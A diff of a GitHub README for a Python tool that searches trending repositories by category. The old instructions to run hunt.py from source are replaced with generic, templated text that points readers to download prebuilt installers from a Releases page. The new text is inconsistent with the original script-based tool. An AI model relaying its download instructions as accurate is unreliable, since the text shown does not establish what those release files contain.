@@ -1,41 +1,70 @@
-# 🚀 GitHub Repo Specialist
+```markdown
+# 🚀 repo-specialist - Discover Trending GitHub Projects Effortlessly
 
-A specialized terminal-based tool built in Python to discover the latest and most relevant repositories on GitHub. This tool helps you hunt for high-quality code in specialized categories.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/markomicic95/repo-specialist/releases)
+
+## 📖 Introduction
+
+Welcome to **repo-specialist**! This application helps you find the latest and most trending GitHub repositories. Whether you're interested in artificial intelligence, cybersecurity, or darkweb projects, this tool will save you time and effort. With real-time API filtering and instant browser access, you can quickly discover high-quality projects that fit your needs.
+
+## 🚀 Getting Started
+
+To use **repo-specialist**, follow these steps:
+
+1. **Download the App**: Get the latest version from our [Releases page](https://github.com/markomicic95/repo-specialist/releases).
+2. **Install the Application**: Follow the installation instructions specific to your operating system.
+3. **Run the Application**: Open the terminal and type `repo-specialist`, then hit enter.
+
+## 💻 System Requirements
+
+Before you download, make sure your system meets the following requirements:
+
+- **Operating System**: Windows, macOS, or Linux.
+- **Python**: Version 3.6 or higher installed. You can download it from [python.org](https://www.python.org/downloads).
+- **Terminal Access**: You should be comfortable using a terminal or command line interface.
+
+## 🛠 Features
+
+**repo-specialist** offers several useful features:
+
+- **Trending Search**: Discover trending GitHub repositories in real-time.
+- **Filter Options**: Narrow your search based on topics like AI, cybersecurity, and more.
+- **Instant Access**: Quickly jump to projects that interests you through browser links.
+
+## 🏁 Download & Install
+
+To download **repo-specialist**, visit this page: [Download the latest release](https://github.com/markomicic95/repo-specialist/releases).
+
+1. **Choose the latest version**: You will see a list of files available for download.
+2. **Select your file**: Depending on your OS, download the relevant installer or package.
+3. **Follow the installation guide**: Install the application by following the prompts for your system.
+
+## 📜 Usage Instructions
+
+After installation, use the terminal to interact with **repo-specialist**:
+
+1. **Open your terminal**.
+2. **Type**: `repo-specialist` and press enter.
+3. **Follow prompts**: You will receive questions about what type of repositories you want to search for. Answer them to get tailored results.
+
+## 🌍 Contribution Guidelines
+
+If you find a bug or want to enhance the features, your contributions are welcome! Here's how you can contribute:
+
+1. **Fork the Repository**: Click the "Fork" button on the top right corner of this page.
+2. **Clone your fork**: Use `git clone <your-fork-url>` in your terminal.
+3. **Make Changes**: Create a branch, make your changes, and commit them.
+4. **Open a Pull Request**: Submit your changes for review.
+
+## 📃 License
+
+This project is licensed under the MIT License. For more details, refer to the LICENSE file in this repository.
+
+## 📫 Contact
+
+For questions or support, please submit an issue on this repository or reach out to the project maintainer through their GitHub profile.
 
 ---
 
-## ✨ Features
-* **Secure Authentication**: Uses GitHub Personal Access Tokens (PAT) for reliable API access.
-* **Smart Category Filters**: Instant search for AI, Cybersecurity, Darkweb, Databases, and Networking.
-* **Real-Time Data**: Fetches the most recently updated repositories to ensure you find active projects via the GitHub Search API.
-* **Terminal-to-Browser**: Open any repository link in your default browser directly from the terminal.
-
----
-
-## After Launching the tool it look like this 
-   Now Paste your GitHub Token and it will be hidden and hit enter - Then select ripo catagory and hit enter , it will shows u the top 10 best ripos on that catagory - select the number and hit enter it will take    u directly to that ripo
-<img width="796" height="227" alt="Screenshot 2026-01-14 143052" src="https://github.com/user-attachments/assets/054e9ba7-ce6c-4695-b9cb-773e5ba6e57e" />
-<img width="683" height="246" alt="Screenshot 2026-01-14 143114" src="https://github.com/user-attachments/assets/ac34acc9-ff7c-4eb9-9d0e-b447cfb06d99" />
-<img width="1361" height="649" alt="Screenshot 2026-01-14 143144" src="https://github.com/user-attachments/assets/ba2c680d-74e7-4772-81e6-a0dc621e3f05" />
-<img width="1458" height="402" alt="Screenshot 2026-01-14 143208" src="https://github.com/user-attachments/assets/0892ab2c-cbed-4b15-9991-0cbb97761417" />
-
-
-
-## 🛠️ Installation & Setup & launch
-
-### Prepare the Environment & Launching
-Run these commands in your terminal to set up the project:
-```powershell
-# Create project folder
-mkdir repo-specialist && cd repo-specialist
-
-# Set up virtual environment
-python -m venv venv
-.\venv\Scripts\Activate.ps1
-
-# Install dependencies
-pip install requests
-
-# Launch the Tool
-python hunt.py
-
+Thank you for choosing **repo-specialist**! We hope this tool helps you discover amazing projects on GitHub.
+```
